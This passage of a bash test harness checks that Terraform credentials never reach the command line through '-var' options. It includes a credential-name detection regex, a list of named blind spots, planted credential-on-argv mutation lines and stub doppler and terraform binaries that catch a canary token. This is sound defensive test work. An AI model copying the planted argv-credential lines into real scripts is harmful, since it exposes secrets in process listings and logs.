# NAMED BLIND SPOTS (recorded in ADR-280): a credential reaching a NON-matching name (only identity row I1 covers the rehearsal file), a value built by
# concatenation or held in an array element, a YAML folded `>` block, files outside the extension allowlist (.ts, .tf, Dockerfile, extensionless
# scripts) and runbooks under knowledge-base/, `env "TF_VAR_x=$SECRET" terraform` (wrong channel, no current secret use), `-backend-config=` carrying a secret.
# S9 selects on the full run and on a rehearsal-workflow edit (scripts/lib/test-affected-paths.sh); its population is the whole tree.
#
# FLOOR. The scan sees S9_VAR_FLOOR `-var` options on the converted tree (measured; never copy a number from a plan). A scan below the floor is RED, never a clean bill.
# =====================================================================================
S9_VAR_FLOOR=44
S9_WF=".github/workflows/inngest-provision-rehearsal.yml"
S9_IDS_WANT="Teardown only (recovery arm)|Terraform destroy (everything this root owns)|Terraform plan (phase A — NIC absent)|Terraform plan (phase B — NIC attach)"
S9="$TMPD/s9"; assert_fixture_dir "$S9"; mkdir -p "$S9/base" "$S9/mut" "$S9/shim" "$S9/real" "$S9/rows"
cat > "$S9/scan.py" <<'S9PY'
import os, re, subprocess, sys
root = sys.argv[1]
# A terraform/packer `-var` option: left boundary (so `tf-var --` and `-var-file` cannot match), `-var` or `--var`, an optional quote on the
# option word, `=` or whitespace, an optional quote, then NAME= where NAME is a literal identifier or a non-literal ($K, ${K}, $(k)).
OPT = re.compile(r"""(?<![\w-])["']?-{1,2}var["']?(?:=|\s+)["']?(?P<name>[A-Za-z_][A-Za-z0-9_]*|\$[{(]?\w+[})]?)=""")
CRED = re.compile(r"(token|secret|pass(?:w(?:or)?d|phrase)?|pwd|credential|api_?key|private_?key|bearer|auth|hmac|jwt|dsn|cookie|webhook)|(?:^|_)(?:key|pat|pw)$", re.I)
out = subprocess.run(["git", "-C", root, "ls-files", "-z", "--cached", "--others", "--exclude-standard"], capture_output=True, check=True)
for rel in out.stdout.decode("utf-8", "replace").split("\0"):
    parts = rel.split("/")
    if not rel or rel.endswith(".test.sh") or ".test." in parts[-1] or "test" in parts[:-1] or "tests" in parts[:-1] or "fixtures" in parts[:-1] or parts[0] == "knowledge-base":
        continue
    md = rel.endswith(".md")
    if md and parts[0] != "plugins":
        continue
    if not (md or rel.endswith((".yml", ".yaml", ".sh", ".bash"))):
        continue
    try:
        data = open(os.path.join(root, rel), "rb").read()
    except OSError:
        continue
    if b"\0" in data[:8192] or b"-var" not in data:
        continue
    lines = data.decode("utf-8", "replace").split("\n")
    i = 0
    while i < len(lines):
        start, cur = i + 1, lines[i]
        while cur.endswith("\\") and not cur.lstrip().startswith("#") and i + 1 < len(lines):
            i += 1
            cur = cur[:-1] + " " + lines[i].strip()
        i += 1
        if "-var" not in cur or (not md and cur.lstrip().startswith("#")):
            continue
        for m in OPT.finditer(cur):
            name = m.group("name")
            verdict = "nonliteral" if name.startswith("$") else ("name" if CRED.search(name) else "ok")
            print("\t".join([rel, str(start), name, verdict, cur.strip()]))
S9PY
cat > "$S9/steps.py" <<'S9STEPS'
import re, sys, yaml
f, mode = sys.argv[1], sys.argv[2]
d = yaml.safe_load(open(f, encoding="utf-8"))
steps = []
for j in (d.get("jobs") or {}).values():
    steps += [s for s in (j.get("steps") or []) if isinstance(s, dict)] if isinstance(j, dict) else []
TF = re.compile(r"(?:^|--\s+|;\s*|&&\s*|\|\|\s*)terraform\s+(?:plan|destroy)\b")
EXPORT = re.compile(r'^\s*export TF_VAR_zot_pull_token="\$ZOT_PULL"\s*$')


def logical(run):
    out, cur = [], ""
    for ln in run.split("\n"):
        if ln.lstrip().startswith("#") and not cur:
            continue
        if ln.rstrip().endswith("\\"):
            cur += ln.rstrip()[:-1] + " "
            continue
        out.append(cur + ln.strip())
        cur = ""
    return out + ([cur] if cur else [])


tf = [(s.get("name", ""), s["run"]) for s in steps if isinstance(s.get("run"), str) and any(TF.search(x) for x in logical(s["run"]))]
if mode == "ids":
    print("|".join(sorted(n for n, _ in tf)))
else:  # pin: one `<reason>\t<step>` line per violation
    for n, run in tf:
        lines = [x for x in run.split("\n") if not x.lstrip().startswith("#")]
        ex = [i for i, x in enumerate(lines) if EXPORT.match(x)]
        dr = [i for i, x in enumerate(lines) if "doppler run" in x]
        if len(ex) != 1:
            print("export-count\t" + n)
        if not dr or (ex and ex[0] > dr[0]):
            print("export-order\t" + n)
        if not any(re.search(r"\bdoppler run\b.*\s--preserve-env(?=\s|$)", lines[i]) for i in dr):
            print("preserve-env\t" + n)
        if any("--only-secrets" in lines[i] for i in dr):
            print("only-secrets\t" + n)
S9STEPS
s9_scan() { python3 -I "$S9/scan.py" "$1"; }   # <root>: one TSV record per -var option: file, line, name, verdict (ok|name|nonliteral), code
s9_pin() { python3 -I "$S9/steps.py" "$1" pin; }   # <workflow file>: violation lines, empty = every plan/destroy step exports before its doppler run
s9_ids() { python3 -I "$S9/steps.py" "$1" ids; }   # <workflow file>: the sorted names of the steps that run terraform plan or destroy
S9_J_REASONS=""; S9_J_N=0; S9_J_DETAIL=""
s9_judge_text() { # <scan text>: sets S9_J_REASONS (empty = GREEN), S9_J_N, S9_J_DETAIL. Reasons: floor, name:<file>, nonliteral:<file>
  local f
  S9_J_REASONS=""
  S9_J_N="$(grep -c . <<<"$1" || true)"
  S9_J_DETAIL="$(awk -F'\t' 'NF >= 4 && $4 != "ok" { print $1 ":" $2 }' <<<"$1" | tr '\n' ' ')"
  [[ "$S9_J_N" -ge "$S9_VAR_FLOOR" ]] || S9_J_REASONS+=" floor"
  while IFS= read -r f; do [[ -n "$f" ]] && S9_J_REASONS+=" $f"; done < <(awk -F'\t' 'NF >= 4 && $4 != "ok" { print $4 ":" $1 }' <<<"$1" | sort -u)
  S9_J_REASONS="${S9_J_REASONS# }"
}
s9_judge() { s9_judge_text "$(s9_scan "$1")"; } # <root>
s9_i1() { s9_scan "$1" | awk -F'\t' -v f="$S9_WF" '$1 == f { print $3 }' | sort | uniq -c | awk '{ printf "%s%s=%s", s, $2, $1; s = " " }'; } # <root>: the rehearsal workflow's option names with counts
s9_bad() { s9_scan "$1" | awk -F'\t' -v f="$2" '$1 == f && $4 != "ok" { n++ } END { print n + 0 }'; } # <root> <file>: BAD record count
s9_put() { assert_fixture_dir "$1"; mkdir -p "$1/$(dirname "$2")"; printf '%s\n' "$3" > "$1/$2"; } # <root> <relative path> <content>
s9_fresh() { local d="$S9/mut/$1"; assert_fixture_dir "$d"; rm -rf "${d:?}"; cp -a "$S9/base" "$d" && printf '%s' "$d"; } # <name>: prints a new root
s9_edit() { s6_edit "$@" || fatal "S9 mutation did not land: $2"; } # <file> <old> <new> [<count>]: replace exactly <count> occurrences or abort the suite
s9_edit1() { python3 -I -c '
import sys
p, old, new = sys.argv[1:4]
t = open(p, encoding="utf-8").read()
if old not in t: sys.exit(1)
open(p, "w", encoding="utf-8").write(t.replace(old, new, 1))' "$@" || fatal "S9 first-occurrence mutation did not land: $2"; } # <file> <old> <new>: replace the FIRST occurrence only
s9_subst() { python3 -I -c '
import os, sys
root, old, new = sys.argv[1:4]
for dp, dn, fn in os.walk(root):
    dn[:] = [x for x in dn if x != ".git"]
    for f in fn:
        p = os.path.join(dp, f); t = open(p, encoding="utf-8").read()
        if old in t: open(p, "w", encoding="utf-8").write(t.replace(old, new))' "$1" "$2" "$3"; } # <root> <old> <new>: replace in every file
s9_has() { [[ " $S9_J_REASONS " == *" $1 "* ]]; }
( source "$REPO_ROOT/plugins/soleur/test/lib/git-fixture-env.sh" && git_fixture_env "$S9/base" || exit 1; git -C "$S9/base" init -q ) \
  || fatal "S9 could not create the scratch repository"
S9_REAL_SCAN="$(s9_scan "$REPO_ROOT")"
# The base copies EVERY file that carries a -var record (a partial base would trip the floor and turn every mutant RED for the wrong reason).
while IFS= read -r f; do [[ -n "$f" ]] || continue; mkdir -p "$S9/base/$(dirname "$f")"; cp "$REPO_ROOT/$f" "$S9/base/$f"; done < <(cut -f1 <<<"$S9_REAL_SCAN" | sort -u)

# ---- Guard 1 on the real tree ---------------------------------------------------------------------------------------------------------
s9_judge_text "$S9_REAL_SCAN"; S9_REAL_REASONS="$S9_J_REASONS"; S9_REAL_N="$S9_J_N"
if [[ -z "$S9_REAL_REASONS" ]]; then row "S9 Guard 1: no tracked non-test file passes a credential-named variable on a -var option ($S9_REAL_N options seen, derived over the whole tree)" ok
else row "S9 Guard 1: a credential rides a -var option (file:line below), or the scan saw fewer options than its floor; the remedy is TF_VAR_<name> in the step environment" fail "reasons='$S9_REAL_REASONS' at=$S9_J_DETAIL options=$S9_REAL_N"; fi
if [[ "$S9_REAL_N" -ge "$S9_VAR_FLOOR" ]]; then row "S9 floor: the scan saw $S9_REAL_N -var options (the floor is $S9_VAR_FLOOR)" ok
else row "S9 floor: the scan saw fewer than $S9_VAR_FLOOR -var options (a renamed option, moved roots or a broken scanner)" fail "options=$S9_REAL_N"; fi
S9_I1="$(s9_i1 "$REPO_ROOT")"
if [[ "$S9_I1" == "nic_attached=4 rehearsal_run_id=4" ]]; then row "S9 I1: the rehearsal workflow's -var options are exactly rehearsal_run_id x4 and nic_attached x4 (a new benign -var there is a deliberate edit of this row)" ok
else row "S9 I1: the rehearsal workflow's -var option set changed" fail "got='$S9_I1'"; fi
S9_PIN="$(s9_pin "$REPO_ROOT/$S9_WF")"
if [[ -z "$S9_PIN" ]]; then row "S9 I2: each terraform plan/destroy step exports TF_VAR_zot_pull_token (the read variable) exactly once, BEFORE its doppler run, keeps bare --preserve-env and has no --only-secrets" ok
else row "S9 I2: a terraform step does not export TF_VAR_zot_pull_token before its doppler run (or lost --preserve-env)" fail "$(tr '\t\n' '= ' <<<"$S9_PIN")"; fi
S9_IDS="$(s9_ids "$REPO_ROOT/$S9_WF")"
if [[ "$S9_IDS" == "$S9_IDS_WANT" ]]; then row "S9 step set: the steps that run terraform plan or destroy are exactly the four named steps (parsed from the YAML)" ok
else row "S9 step set: a terraform plan/destroy step was added, removed or renamed (the pin and the executed rows must cover it)" fail "got='$S9_IDS'"; fi

# ---- the baseline-GREEN control: the scratch base is judged by the SAME function and must be green --------------------------------------
s9_judge "$S9/base"
if [[ -z "$S9_J_REASONS" && "$S9_J_N" -eq "$S9_REAL_N" && -z "$(s9_pin "$S9/base/$S9_WF")" ]]; then row "S9 control: the scratch base (a copy of every file with a -var record) is judged GREEN with the real tree's count, so each mutant below is RED for its mutation alone" ok
else row "S9 control: the scratch base is not GREEN with the real count (every mutant below would be measuring the base)" fail "reasons='$S9_J_REASONS' n=$S9_J_N/$S9_REAL_N"; fi
s9_judge_text ""
if s9_has floor; then row "S9 harness: a scanner that prints nothing is RED (reason floor), never a clean bill" ok; else row "S9 harness: an empty scan was not judged floor" fail "reasons='$S9_J_REASONS'"; fi

# ---- Guard 1 mutations ------------------------------------------------------------------------------------------------------------------
d="$(s9_fresh m1)"; printf '%s\n' '      terraform plan -var "zot_pull_token=${ZOT_PULL}"' >> "$d/$S9_WF"; s9_judge "$d"
if [[ "$S9_J_REASONS" == "name:$S9_WF" ]]; then row "S9 mutation 1: one rehearsal site reverted to -var \"zot_pull_token=...\" is RED, reason name:<that file>" ok
else row "S9 mutation 1: a reverted site was not judged name:$S9_WF" fail "reasons='$S9_J_REASONS'"; fi
d="$(s9_fresh m2)"; rm -rf "${d:?}/apps" "${d:?}/scripts" "${d:?}/.github" "${d:?}/plugins"; s9_judge "$d"
if [[ "$S9_J_REASONS" == "floor" && "$S9_J_N" -eq 0 ]]; then row "S9 mutation 2: the scan roots deleted (0 options) is RED, reason exactly floor" ok
else row "S9 mutation 2: broken scan roots were not judged floor" fail "reasons='$S9_J_REASONS' n=$S9_J_N"; fi
d="$(s9_fresh m3)"; s9_subst "$d" '-var' '-vars'; s9_judge "$d"
if [[ "$S9_J_REASONS" == "floor" ]]; then row "S9 mutation 3: the option renamed in every file (the scan sees nothing) is RED, reason exactly floor" ok
else row "S9 mutation 3: a renamed option was not judged floor" fail "reasons='$S9_J_REASONS'"; fi
m3b=""; n3=0
for v in 'terraform plan --var api_token=$T' 'ARGS=("-var" "api_token=$T")' 'terraform plan -var "$K=$V"' 'terraform plan -var "rehearsal_run_id=1" -var "api_token=$T"' 'VAR_ARGS+=(-var="deploy_token=$T")' 'bash -c "terraform plan -var db_password=$P"' \
         'terraform plan -var=api_key=$T' "terraform plan -var 'client_secret=\$T'" 'echo "step #1"; terraform plan -var auth_header=$H'; do
  n3=$((n3 + 1)); d="$(s9_fresh m3b-$n3)"; s9_put "$d" scripts/extra.sh "$v"; s9_judge "$d"
  case "$S9_J_REASONS" in "name:scripts/extra.sh"|"nonliteral:scripts/extra.sh") : ;; *) m3b+=" [$v => '$S9_J_REASONS']" ;; esac
done
if [[ -z "$m3b" ]]; then row "S9 mutation 3b: the double-dash spelling, a quoted option word, a non-literal name, a second option on one line, an array append, a bash -c payload, -var=NAME=v, a single-quoted pair and a quoted '#' earlier on the line are each RED for that file" ok
else row "S9 mutation 3b: a credential -var spelling was judged clean" fail "$m3b"; fi
d="$(s9_fresh m5)"; s9_edit "$d/$S9_WF" '-var nic_attached=true' '-var nic_attached=true -var "zot_pull_credential=${ZOT_PULL}"'; s9_judge "$d"; m5a="$S9_J_REASONS"
d="$(s9_fresh m5b)"; s9_edit "$d/$S9_WF" '-var nic_attached=true' '-var nic_attached=true -var "extra_flag=1"'; s9_judge "$d"; m5b="$S9_J_REASONS"; m5i="$(s9_i1 "$d")"
if [[ "$m5a" == "name:$S9_WF" && -z "$m5b" && "$m5i" != "nic_attached=4 rehearsal_run_id=4" ]]; then row "S9 mutation 5: a new credential-named -var in the rehearsal workflow is RED (name); a new benign one passes the scan but fails identity row I1 (the set is closed)" ok
else row "S9 mutation 5: the rehearsal option set is not closed" fail "credential='$m5a' benign='$m5b' i1='$m5i'"; fi
d="$(s9_fresh m6)"; s9_edit "$d/plugins/soleur/skills/deploy/references/hetzner-setup.md" 'read -rs TF_VAR_hcloud_token; export TF_VAR_hcloud_token' '-var="hcloud_token=<your-token>"' ; s9_judge "$d"
if [[ "$S9_J_REASONS" == "name:plugins/soleur/skills/deploy/references/hetzner-setup.md" ]]; then row "S9 mutation 6: restoring -var=\"hcloud_token=<your-token>\" in the plugin doc is RED (agent-run markdown is in the corpus)" ok
else row "S9 mutation 6: the plugin-doc credential -var was judged clean" fail "reasons='$S9_J_REASONS'"; fi
d="$(s9_fresh m7a)"; s9_edit1 "$d/$S9_WF" $'          export TF_VAR_zot_pull_token="$ZOT_PULL"\n' ''
s9_edit1 "$d/$S9_WF" $'-var "rehearsal_run_id=${GITHUB_RUN_ID}" -var nic_attached=false\n' $'-var "rehearsal_run_id=${GITHUB_RUN_ID}" -var nic_attached=false\n          export TF_VAR_zot_pull_token="$ZOT_PULL"\n'
m7a="$(s9_pin "$d/$S9_WF" | tr '\t\n' '= ')"
d="$(s9_fresh m7b)"; s9_edit1 "$d/$S9_WF" 'doppler run --preserve-env' 'doppler run'; m7b="$(s9_pin "$d/$S9_WF" | tr '\t\n' '= ')"
if [[ "$m7a" == "export-order=Teardown only (recovery arm) " && "$m7b" == "preserve-env=Teardown only (recovery arm) " ]]; then row "S9 mutation 7: moving the export after the doppler run, and dropping bare --preserve-env, are each RED in the static pin while the export line still exists" ok
else row "S9 mutation 7: the static pin did not see a reordered export or a dropped --preserve-env" fail "order='$m7a' preserve='$m7b'"; fi
d="$(s9_fresh m8a)"; s9_edit "$d/$S9_WF" '- name: Terraform destroy (everything this root owns)' '- name: Terraform destroy (renamed)'; m8a="$(s9_ids "$d/$S9_WF")"
d="$(s9_fresh m8b)"; s9_edit "$d/$S9_WF" '      - name: Assert no rehearsal orphans remain (Hetzner API)' $'      - name: Extra destroy\n        run: |\n          terraform destroy -auto-approve\n      - name: Assert no rehearsal orphans remain (Hetzner API)'; m8b="$(s9_ids "$d/$S9_WF")"
if [[ "$m8a" != "$S9_IDS_WANT" && "$m8b" != "$S9_IDS_WANT" ]]; then row "S9 mutation 8: renaming a destroy step, and adding a third one, each change the YAML-derived step set (a count would survive the rename)" ok
else row "S9 mutation 8: the step-set identity survived a rename or an added destroy step" fail "renamed='$m8a' added='$m8b'"; fi

# ---- must-pass inputs that are NOT credential -var options: zero BAD records ---------------------------------------------------------
d="$(s9_fresh pass1)"
s9_put "$d" scripts/ok.sh "$(cat <<'S9PASS'
terraform plan -var "ssh_key_path=${CI_SSH_PUB}" -var image_name="$PINNED"
terraform plan -var-file=<(printf 'x=1\n')
doppler run --preserve-env --name-transformer tf-var -- \
  terraform plan -no-color
# terraform plan -var api_token=x
TOKEN="$(doppler secrets get FOO --plain)"
terraform plan -var "image_name=${PINNED}"
S9PASS
)"
s9_put "$d" scripts/bad.test.sh 'terraform plan -var "api_token=$T"'
s9_put "$d" knowledge-base/runbook.sh 'terraform plan -var "api_token=$T"'
if [[ "$(s9_bad "$d" scripts/ok.sh)" -eq 0 && "$(s9_scan "$d" | awk -F'\t' '$1 == "scripts/ok.sh" { n++ } END { print n + 0 }')" -eq 3 ]]; then row "S9 must-pass: a clean ssh_key_path/image_name option, -var-file, the tf-var transformer line, a comment, and a file that reads a secret AND passes a clean -var are judged GREEN (3 options counted, 0 bad)" ok
else row "S9 must-pass: a non-credential -var shape was judged bad or mis-counted" fail "bad=$(s9_bad "$d" scripts/ok.sh)"; fi
m_x=""; n_x=0
for pair in 'x/test/a.sh:0' 'x/tests/a.sh:0' 'x/fixtures/a.sh:0' 'a.test.sh:0' 'knowledge-base/a.sh:0' 'docs/a.md:0' 'plugins/a.md:1' 'scripts/testing/a.sh:1' 'apps/a.sh:1'; do
  n_x=$((n_x + 1)); d="$(s9_fresh excl-$n_x)"; s9_put "$d" "${pair%%:*}" 'terraform plan -var "api_token=$T"'
  [[ "$(s9_bad "$d" "${pair%%:*}")" -eq "${pair##*:}" ]] || m_x+=" [${pair%%:*} => want ${pair##*:} bad]"
done
if [[ -z "$m_x" ]]; then row "S9 exclusions: a credential -var under test/, tests/, fixtures/, *.test.*, knowledge-base/ or a .md outside plugins/ is not scanned, and the same under plugins/*.md, scripts/testing/ and apps/ is" ok
else row "S9 exclusions: an exclusion rule hid a credential -var it should not, or missed one it should" fail "$m_x"; fi

# ---- Guard 2: the two terraform destroy step bodies EXECUTED under stubs --------------------------------------------------------------
S9_CANARY="S9CANARYzot0123"; S9_PRD="s9-prd-scope-0123"; S9_DEF="s9-default-scope-0123"
for t in bash env cat grep tr date mkdir rm printf; do p="$(type -P "$t" || true)"; [[ -n "$p" ]] && ln -s "$p" "$S9/real/$t"; done
{ printf '#!%s\n' "$BASH_BIN"; cat <<'S9DOP'
# Stub doppler: records argv (NUL-delimited). `secrets get` answers only for the exact argv and only under the PRD-scope token (else the modelled 403);
# `run` execs the command after `--` and injects NO TF_VAR_* (production inherits an equal value from prd_terraform; the stub models the unmeasured case).
printf '%s\0' "$@" > "$CALLS_DIR/doppler.$$.argv"
case "${1-}" in
  secrets)
    if [[ "$*" != "secrets get ZOT_PULL_TOKEN -p soleur -c prd --plain" ]]; then printf 'S9-STUB-64 unexpected argv\n' >> "$CALLS_DIR/refusals"; exit 64; fi
    if [[ "${DOPPLER_TOKEN-}" != "$S9_PRD_EXPECT" ]]; then printf 'S9-STUB-403 wrong scope\n' >> "$CALLS_DIR/refusals"; echo 'Doppler Error: 403' >&2; exit 1; fi
    printf '%s' "$S9_CANARY_VAL"; exit 0 ;;
  run) shift; while [[ $# -gt 0 && "$1" != -- ]]; do shift; done; shift; exec "$@" ;;
esac
printf 'S9-STUB-64 unknown verb\n' >> "$CALLS_DIR/refusals"; exit 64
S9DOP
} > "$S9/shim/doppler"
{ printf '#!%s\n' "$BASH_BIN"; cat <<'S9TF'
# Stub terraform: records argv and the value of TF_VAR_zot_pull_token (or the literal <unset>).
printf '%s\0' "$@" > "$CALLS_DIR/terraform.$$.argv"
printf '%s' "${TF_VAR_zot_pull_token-<unset>}" > "$CALLS_DIR/terraform.$$.tfvar"
echo "S9 terraform stub: $1"
S9TF
} > "$S9/shim/terraform"
chmod +x "$S9/shim/doppler" "$S9/shim/terraform"
S9_N=0
s9_run() { # <bodyfile> -> S9_RC S9_DIR
  local r; S9_N=$((S9_N + 1)); r="$S9/rows/r$S9_N"; assert_fixture_dir "$r"; mkdir -p "$r/calls" "$r/cwd"
  S9_RC=0
  ( cd "$r/cwd" && env -i PATH="$S9/shim:$S9/real" HOME="$r" CALLS_DIR="$r/calls" GITHUB_RUN_ID=424242 DOPPLER_TOKEN="$S9_DEF" DOPPLER_TOKEN_PRD="$S9_PRD" \
      S9_PRD_EXPECT="$S9_PRD" S9_CANARY_VAL="$S9_CANARY" "$BASH_BIN" --noprofile --norc -eo pipefail "$1" ) > "$r/out" 2>&1 || S9_RC=$?
  S9_DIR="$r"
}
s9_judge_run() { # sets S9_J_REASONS (empty = GREEN). Reasons, in this order: rc ncalls canary-in-argv env-not-set env-value-differs run-id refused
  local f n=0 tv="<none>" argvs=""
  S9_J_REASONS=""
  [[ "$S9_RC" == 0 ]] || S9_J_REASONS+=" rc"
  for f in "$S9_DIR"/calls/terraform.*.argv; do [[ -e "$f" ]] || continue; n=$((n + 1)); tv="$(cat "${f%.argv}.tfvar")"; done
  [[ "$n" == 1 ]] || S9_J_REASONS+=" ncalls"
  for f in "$S9_DIR"/calls/*.argv; do [[ -e "$f" ]] || continue; if grep -qF -- "$S9_CANARY" <(tr '\0' '\n' < "$f"); then S9_J_REASONS+=" canary-in-argv"; break; fi; done
  if [[ "$tv" == "<unset>" ]]; then S9_J_REASONS+=" env-not-set"; elif [[ "$n" -ge 1 && "$tv" != "$S9_CANARY" ]]; then S9_J_REASONS+=" env-value-differs"; fi
  for f in "$S9_DIR"/calls/terraform.*.argv; do [[ -e "$f" ]] || continue; grep -qxF -- "rehearsal_run_id=424242" <(tr '\0' '\n' < "$f") || { S9_J_REASONS+=" run-id"; break; }; done
  [[ ! -s "$S9_DIR/calls/refusals" ]] || S9_J_REASONS+=" refused"
  S9_J_REASONS="${S9_J_REASONS# }"
}
S9_EXP=$'export TF_VAR_zot_pull_token="$ZOT_PULL"\n'; S9_TAIL=$'-var nic_attached=false\n'; S9_MASK="printf '::add-mask::%s\\n' \"\$ZOT_PULL\""$'\n'
s9_mrow() { # <tag> <id> <want reasons> <old> <new> [<old> <new>]...: copy the body, apply exact edits, run it, judge it
  local tag="$1" id="$2" want="$3" b="$S9/body-$1.sh" m="$S9/m-$1-$2.sh"; shift 3
  cp "$b" "$m" || fatal "S9 could not copy $b"
  while [[ $# -ge 2 ]]; do s9_edit "$m" "$1" "$2"; shift 2; done
  s9_run "$m"; s9_judge_run
  if [[ "$S9_J_REASONS" == "$want" ]]; then row "S9 Guard 2 $id ($tag): judged '$want' (empty = GREEN)" ok
  else row "S9 Guard 2 $id ($tag): wrong verdict" fail "want='$want' got='$S9_J_REASONS'"; fi
}
for spec in 'teardown-only|Teardown only (recovery arm)' 'teardown-job|Terraform destroy (everything'; do
  tag="${spec%%|*}"; sel="${spec#*|}"
  s3_body "$REPO_ROOT/$S9_WF" "$sel" > "$S9/body-$tag.sh" || fatal "S9 could not extract the $tag step"
  s9_run "$S9/body-$tag.sh"; s9_judge_run
  if [[ -z "$S9_J_REASONS" ]]; then row "S9 Guard 2 control ($tag): the real destroy body runs GREEN under the stubs: one terraform call, the token in its environment and in no argv, rehearsal_run_id by value" ok
  else row "S9 Guard 2 control ($tag): the real destroy body is not GREEN under the stubs (every mutant below would measure the base)" fail "reasons='$S9_J_REASONS'"; fatal "S9 control not green for $tag: a red baseline voids every mutant"; fi
  s9_mrow "$tag" m1a "canary-in-argv env-not-set" "$S9_EXP" '' "$S9_TAIL" $'-var nic_attached=false \\\n    -var "zot_pull_token=${ZOT_PULL}"\n'
  s9_mrow "$tag" m1b "canary-in-argv" "$S9_TAIL" $'-var nic_attached=false \\\n    -var "zot_pull_token=${ZOT_PULL}"\n'
  s9_mrow "$tag" m2-reorder "env-not-set" "$S9_EXP" '' "$S9_TAIL" "$S9_TAIL$S9_EXP"
  s9_mrow "$tag" m3-value "env-value-differs" "$S9_EXP" $'export TF_VAR_zot_pull_token="x${ZOT_PULL}"\n'
  s9_mrow "$tag" m6-run-id "run-id" '-var "rehearsal_run_id=${GITHUB_RUN_ID}"' '-var "rehearsal_run_id=x"'
  s9_mrow "$tag" m7-two-calls "ncalls" "$S9_TAIL" "${S9_TAIL}"$'terraform destroy -input=false -var "rehearsal_run_id=${GITHUB_RUN_ID}"\n'
  s9_mrow "$tag" pass-braces-before-mask-extra-export "" "$S9_EXP" $'export TF_LOG=error\n' "$S9_MASK" $'export TF_VAR_zot_pull_token="${ZOT_PULL}"\n'"$S9_MASK"
  m="$S9/m-$tag-m4.sh"; cp "$S9/body-$tag.sh" "$m"; s9_edit "$m" 'DOPPLER_TOKEN="$DOPPLER_TOKEN_PRD" doppler secrets get' 'doppler secrets get'; s9_run "$m"; s9_judge_run
  if [[ "$S9_J_REASONS" == "rc ncalls refused" ]] && grep -qF 'S9-STUB-403' "$S9_DIR/calls/refusals"; then row "S9 Guard 2 m4 ($tag): reading the token with the default-scope Doppler token fails the step loudly (rc != 0, no terraform call, the modelled 403 logged)" ok
  else row "S9 Guard 2 m4 ($tag): the wrong-scope read did not fail the step with the refusal logged" fail "got='$S9_J_REASONS'"; fi
done
echo "=== stage S9: Guard 1 rows (terraform -var credentials: derived scan, floor, identity, mutations, must-pass inputs) and Guard 2 rows (destroy bodies executed under stubs) done ==="

# =====================================================================================
# VERDICT. The floor and the conservation check are reported with printf + exit 1, never
# through the helpers they guard. Rows only grow as probes convert, so the floor is a LOWER bound.
# =====================================================================================
# Conservation: `row` counts at the call site, `_report` counts the verdict. If they diverge the
# helper stopped counting (or a row bypassed it). A function over its three counters so a control can
# drive it with a doctored set: a check that can be disabled while the suite stays green is no check.
check_conservation() { # <pass> <fail> <cases>: rc 1 (and a message) when pass+fail != cases
  if [[ "$(($1 + $2))" -ne "$3" ]]; then
    printf '[FAIL] harness: pass+fail=%s but %s rows were dispatched -- the reporting helper stopped counting\n' "$(($1 + $2))" "$3" >&2
    return 1
  fi
  return 0
}
# The control runs in a subshell (stderr discarded) with counters that do NOT reconcile, and with a set that
# does; reported with printf + exit, never through `row`/`_report` (the helpers under test).
cc_bad=0; cc_good=0
( check_conservation 3 0 4 ) > /dev/null 2>&1 && cc_bad=1
( check_conservation 3 1 4 ) > /dev/null 2>&1 && cc_good=1
if [[ "$cc_bad" -ne 0 || "$cc_good" -ne 1 ]]; then
  printf '[FAIL] harness: the conservation check accepted a doctored counter (accepted-mismatch=%s accepted-match=%s)\n' "$cc_bad" "$cc_good" >&2
  exit 1
fi
echo "=== $pass passed, $fail failed ==="
check_conservation "$pass" "$fail" "$CASES" || exit 1

# BOTH operands are literals on the lines IMMEDIATELY above the `if`.
SELFTEST_PASSES=0
# 730 -> 752 at #9757 (held-back HMAC arms, census allowance, leads (a)(b)(g)): the MEASURED green total (752 passed, 0 failed; the self-test rows are
# retracted, so SELFTEST_PASSES stays 0). Derived from the run, never estimated.
# 752 -> 770 at #9757 (stage S6, Guard 3: htpasswd password off argv): the 18 S6 rows, measured (770 passed, 0 failed).
# 770 -> 781 at #9757 (stage S6-HB, Guard 2: heartbeat URL off curl argv, derived population): the 11 S6-HB rows, measured (781 passed, 0 failed).
# 781 -> 796 at #10093 (stage S7, Guard 3 for markdown: bearer and apikey headers off curl argv in plugins/**/*.md): the 15 S7 rows, measured (796 passed, 0 failed).
# 796 -> 801 at the PR #10185 fix round (S7: the Rule E header names, the executed-snippet rows and their control): 5 more S7 rows, measured (801 passed, 0 failed).
# 801 -> 802 at the fix-round batch (S7: an executed row for the deploy-status-debugging snippet; the ship row also covers APP_DOMAIN_BASE): measured (802 passed, 0 failed).
# 802 -> 808 at PR B (#10119, registry template): S6 registry site rows now identity rows, the ceiling row also judges a grow-by-one allowlist, mutation 8 (each registry site back to argv) and the S6-REG heartbeat scan (real tree, three mutations, one must-pass): measured (808 passed, 0 failed). 808 -> 811 at review (S6-REG mutations 5-7: comment-backslash, absolute curl path, continuation split).
# 811 -> 819 at PR C (#10120, probe scripts of #10093): four converted-script rows (the inngest body and the three probes join S6H_CONVERTED), mutations 1b (inngest body), 1c (the three probes), 3c (a probe) and the inngest guard-class mutation; the stale and growth mutations are re-anchored, the ceiling row is 0 == 0: measured (819 passed, 0 failed).
# 819 -> 823 at the PR C review round: the guard-copy parity row and its mutation row, and two scanner-reach rows (bare HEARTBEAT_URL; path-prefixed, backslashed and backtick curl): measured (823 passed, 0 failed).
# 823 -> 840 at #9757 (stage S8, Guard 3: registry login password off argv, tokenised derived census): the 15 S8 rows. The tree measured 825 before S8 (the floor had 2 rows of slack), so the new floor is the measured total (840 passed, 0 failed).
# 840 -> 878 at #9757 item 2 (stage S9, terraform -var credentials off argv: derived scan, rehearsal-workflow pins, destroy bodies executed under stubs): the 35 S9 rows. The tree measured 843 before S9 (the floor had 3 rows of slack), so the new floor is the measured total (878 passed, 0 failed).
EXPECTED_TESTS=878
REAL=$((pass + fail - SELFTEST_PASSES))
if [[ "$REAL" -lt "$EXPECTED_TESTS" ]]; then
  printf 'ANTI-VACUITY FLOOR: only %s rows ran, floor is %s -- rows were skipped, truncated, or the assertion machinery was neutered.\n' "$REAL" "$EXPECTED_TESTS" >&2
  exit 1
fi

[[ "$fail" -eq 0 ]]
